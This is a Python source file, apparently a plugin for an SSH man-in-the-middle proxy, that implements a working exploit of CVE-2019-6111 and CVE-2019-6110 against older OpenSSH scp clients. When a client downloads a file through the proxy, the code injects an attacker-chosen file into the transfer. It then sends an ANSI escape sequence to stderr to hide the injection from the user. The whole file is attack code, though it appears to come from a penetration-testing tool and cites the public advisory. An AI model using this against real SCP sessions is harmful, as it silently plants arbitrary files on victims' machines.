import logging
import os

from ssh_proxy_server.forwarders.scp import SCPForwarder


class SCPInjectFile(SCPForwarder):
    '''
    Injecting an additional file during SCP transmission

    This feature is based on a OpenSSH Client Vulnerability 'SSHtranger Things'
    that has been patched with version > OpenSSH 8.0p1

    Title:     SSHtranger Things
    Author:    Mark E. Haase <mhaase@hyperiongray.com>
    Homepage:  https://www.hyperiongray.com
    Date:      2019-01-17
    CVE:       CVE-2019-6111, CVE-2019-6110
    Advisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt
    '''

    @classmethod
    def parser_arguments(cls):
        cls.PARSER.add_argument(
            '--scp-inject',
            dest='scp_inject_file',
            required=True,
            help='file that is used for injection'
        )

    def __new__(cls, *args, **kwargs):
        if args[0].scp_command.find(b'-f') != -1:
            return super(SCPInjectFile, cls).__new__(cls)
        else:
            logging.info("SCPClient is not downloading a file, reverting to normal SCPForwarder")
            forwarder = SCPForwarder.__new__(SCPForwarder)
            forwarder.__init__(args[0])
            return forwarder

    def __init__(self, session) -> None:
        super().__init__(session)
        self.args.scp_inject_file = os.path.expanduser(self.args.scp_inject_file)

        self.injectable = False
        self.inject_file_stat = os.stat(self.args.scp_inject_file)
        self.file_to_inject = open(self.args.scp_inject_file, 'rb')

    def process_data(self, traffic):
        if traffic == b'\x00':
            self.injectable = True
            self.exploit()
        return traffic

    def handle_traffic(self, traffic):
        logging.debug(traffic)
        if not self.injectable:
            return super(SCPInjectFile, self).handle_traffic(traffic)
        else:
            self.exploit()

    def exploit(self):
        def wait_ok():
            get = self.session.scp_channel.recv(1024)
            logging.debug("EXPLOIT: " + str(get))
            assert get == b'\x00'

        def send_ok():
            logging.debug("EXPLOIT: x00")
            self.session.scp_channel.sendall(b'\x00')

        send_ok()
        wait_ok()
        # This is CVE-2019-6111: whatever file the client requested, we send
        # them 'exploit.txt' instead.
        logging.info('Injecting file %s to channel %d', self.args.scp_inject_file, self.session.scp_channel.get_id())
        command = "{}{} {} {}\n".format(
            self.file_command,
            "{0:o}".format(self.inject_file_stat.st_mode)[2:],
            self.inject_file_stat.st_size,
            self.args.scp_inject_file
        )
        logging.info("Sending command %s", command)
        self.session.scp_channel.sendall(command)
        wait_ok()
        self.session.scp_channel.sendall(self.file_to_inject.read())
        self.file_to_inject.close()
        send_ok()
        wait_ok()
        # This is CVE-2019-6110: the client will display the text that we send
        # to stderr, even if it contains ANSI escape sequences. We can send
        # ANSI codes that clear the current line to hide the fact that a second
        # file was transmitted..
        logging.info('Covering our tracks by sending ANSI escape sequence')
        self.session.scp_channel.sendall_stderr("\x1b[1A".encode('ascii'))
